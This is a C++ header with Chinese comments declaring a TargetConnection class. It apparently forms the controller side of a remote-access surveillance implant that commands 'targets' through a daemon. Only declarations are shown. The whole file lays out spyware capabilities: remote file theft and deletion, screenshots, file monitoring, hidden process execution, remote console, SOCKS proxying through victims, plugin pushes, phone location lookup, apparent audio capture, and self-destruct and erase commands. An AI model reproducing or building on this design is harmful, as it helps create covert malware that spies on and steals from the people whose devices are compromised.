
//---------------------------------------------------------------------------

#ifndef TargetConnectionH
#define TargetConnectionH
//---------------------------------------------------------------------------
#include "connection.h"
#include "target.h"

class TargetConnection;
//---------------------------------------------------------------------------

class TargetConnection : public Connection
{
public:
     TargetConnection(SOCKET sock, DWORD dwTargetId);
     ~TargetConnection();
      
	 void FlowStatistics(unsigned int bytes);

protected:

	virtual void  HandleIncomingData();
    virtual void  ConnectionCompleted();
    virtual void  ConnectionClosed();

public:

	void  Send_Identity();
	void  Send_HEL();
	void  Send_INI();
	void  Send_FLD();

	void Send_IDE(const char* password);

	// 查询和设置中转服务器迁移信息
	//
	void  Send_QDA(ULONG targetId);
	void  Send_SDA(PBYTE lpData, DWORD dwDataSize);

	void  Send_SDA(ULONG targetId, DWORD value);

	// 插件相关
	//
	void  Send_PLI(ULONG targetId);       // 查询插件信息
	void  Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen);       // 设置插件属性
	void  StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType);
	void  Send_UPL(DWORD       dwPluginId,
		DWORD       dwNewPlgVer,
		DWORD       dwStartPos,                             
		std::string flag,
		PCHAR       lpData,
		DWORD       dwDataLen,
		DWORD		 dwOsType);

	void  Send_STA(ULONG targetId);       // 查询目标状态
	void  Send_PNG();                     // 保持响应

	void  Send_LIR(ULONG targetId);                       // 查询目标盘符列表
	void  Send_DIR(ULONG targetId,   const char *base64Path);     // 查询目标目录信息
	void  Send_FDL(ULONG targetId,   const char *base64Path);     // 删除目标上的某个文件

	// 目标操作: 自毁、静默、清除
	//
	void  Send_ERA(ULONG targetId);
	void  Send_SDS(ULONG targetId);
	void  Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd);

	// 截屏
	//
	void  Send_SCP(ULONG  targetID);

	// 在线搜索
	//
	void  Send_OSC(ULONG          targetID,
		ULONG          osId,
		const char*          tarDirPathBase64,
		ULONG          level,
		PSearchFilter  lpSearchFilter);                    // 启动搜索

	void  Send_OSF(ULONG          targetID,
		ULONG          osId);                              // 停止搜索

	// Socks代理
	//
	void  Send_SSX(ULONG ulTargetID,  USHORT usPort); // 启动
	void  Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass); // 启动
	void  Send_ESX(ULONG ulTargetID);                                 // 停止

	// plugin manager cmd (direct to target)
	//
	void  Send_PLG(ULONG targetId, ULONG   pluginId, char    *plgType);

	void  Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec);

	// 远近扩展执行
	//
	void  Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO);
	void  Send_CITW(DWORD dwTargetID, std::wstring widInput);
	void  Send_CITA(DWORD dwTargetID, std::string aniInput);
	void  Send_CFI(DWORD dwTargetID);

	// 文件监控
	void Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext);

	// 获取所在地（手机专用）
	void Send_GPRS(DWORD dwTargetId);
	int Handle_GPRS(std::vector<std::string> & args);

	// 自动获取
	void Send_AGT(
		ULONG      targetID,
		TaskDirect taskDirect,
		const char*      tarDirPathBase64,
		ULONG      level,
		ULONG      autoDown);

	// 背景音
	void Send_BACKSOUND(ULONG targetID, bool open, ULONG time);

    // FileTask
    //
    void  Send_FTK(ULONG targetId, ULONG taskId);     // 查询 FileTask (taskID为0，说明查询全部0
    void  Send_DTK(ULONG targetId, ULONG taskId, BOOL bDetail);                   // 查询 DirTask
    void  Send_STK(ULONG targetId, ULONG taskId);                   // 查询 SearchTask

    void  Send_AFT(ULONG        targetID,
                             TaskDirect   taskDirect,
                             const char*        ctrPathBase64,
                             const char*        tarPathBase64,
                             ULONG        totalLen);                // 增加 FileTask
                             
    void  Send_ADT(ULONG      targetID,
                             TaskDirect taskDirect,
                             const char*      tarDirPathBase64,
                             ULONG      level,
                             ULONG      autoDown);                  // 增加 DirTask

    void  Send_AST(ULONG          targetID,
                             TaskDirect     taskDirect,
                             PCHAR          tarDirPathBase64,
                             ULONG          level,
                             PSearchFilter  lpSearchFilter,
                             ULONG          autoDown);                  // 增加SearchTask

    void  Send_CFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // 清除 Task
    void  Send_PFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // 暂停 Task
    void  Send_RFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // 继续 Task
    void  Send_DFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // 通知 Daemon直接删除 Task
    
    // file task manager
    //
    void  Start_UPL(FileTask *fileTask);
    void  Send_UPL(FileTask *fileTask, std::string flag, ULONG dataLen);
    void  Send_DOW(DWORD dwTaskId, int startPos, std::string pathBase64);
    void  Send_ERR(FileTask *fileTask);
    
private:

	// static std::map<std::string,TargetCmdHandler > commandHandlers;
                                                  
    int   DispatchCommand(std::vector<std::string> & args);
    void  RegisterCommandHandlers();

    //int   Handle_HEL(std::vector<std::string> & args);
    int   Handle_QNG(std::vector<std::string> & args);

    // FileTask相关指令解释函数
    //
    int   Handle_SCH(std::vector<std::string> & args);    // 重新调度
    int   Handle_FTS(std::vector<std::string> & args);

    int   Handle_FTK(std::vector<std::string> & args);
    int   Handle_DTK(std::vector<std::string> & args);
    int   Handle_STK(std::vector<std::string> & args);

    int   Handle_AFT(std::vector<std::string> & args);
    int   Handle_ADT(std::vector<std::string> & args);
    int   Handle_AST(std::vector<std::string> & args);

    int   Handle_CFT(std::vector<std::string> & args);
    int   Handle_PFT(std::vector<std::string> & args);
    int   Handle_RFT(std::vector<std::string> & args);
        
    // 文件上传下载
    //
	int   Handle_DOW(std::vector<std::string> & args);
	int   Handle_UPL(std::vector<std::string> & args);
    int   Handle_FDT(std::vector<std::string> & args);    // 文件时间信息

    // Plugin Section
    //
    int   Handle_Plugin_CMD(std::vector<std::string> &args);

	int   Handle_OUT(std::vector<std::string> & args);

	int   Handle_INI(std::vector<std::string> & args);
	int   Handle_TAR(std::vector<std::string> & args);
	int   Handle_CIN(std::vector<std::string> & args);
	int   Handle_STA(std::vector<std::string> & args);
	int   Handle_LOG(std::vector<std::string> & args);

	int   Handle_TSW(std::vector<std::string> & args);

	int   Handle_QDA(std::vector<std::string> & args);

	int   Handle_LIR(std::vector<std::string> & args);
	int   Handle_DIR(std::vector<std::string> & args);
	int   Handle_FDL(std::vector<std::string> & args);

	// 截屏
	//
	int   Handle_SCP(std::vector<std::string> & args);

	// 在线搜索
	//
	int   Handle_OSC(std::vector<std::string> & args);            // 搜索启动
	int   Handle_OSF(std::vector<std::string> & args);            // 人工停止或结束
	int   Handle_OSI(std::vector<std::string> & args);            // 得到搜索项

	// Socks代理
	//
	int   Handle_SSX(std::vector<std::string> & args);
	int   Handle_ESX(std::vector<std::string> & args);

	// 插件相关
	//
	int   Handle_PLI(std::vector<std::string> & args);
	int   Handle_PLD(std::vector<std::string> & args);

	int   Handle_PLG(std::vector<std::string> & args);

	int   Handle_CRP(std::vector<std::string> & args);
	int   Handle_RUN(std::vector<std::string> & args);
	int   Handle_CIT(std::vector<std::string> & args);            // Console Input
	int   Handle_COT(std::vector<std::string> & args);            // Console Output
	int   Handle_CFI(std::vector<std::string> & args);            // Console Finished

	int   Handle_ERA(std::vector<std::string> & args);
	int   Handle_SDS(std::vector<std::string> & args);
	int   Handle_SIL(std::vector<std::string> & args);

	// 文件监控
	int Handle_FMT(std::vector<std::string> &args);

	// 背景音
	int Handle_BACKSOUND(std::vector<std::string>& args);

public:

    Target      *ownerTarget;
    char        *readBuf;           // For File Read

	CRITICAL_SECTION csTarConn;
	HANDLE ftkHandle;
};

typedef int  (TargetConnection::* TargetCmdHandler)(std::vector<std::string> &);

#endif
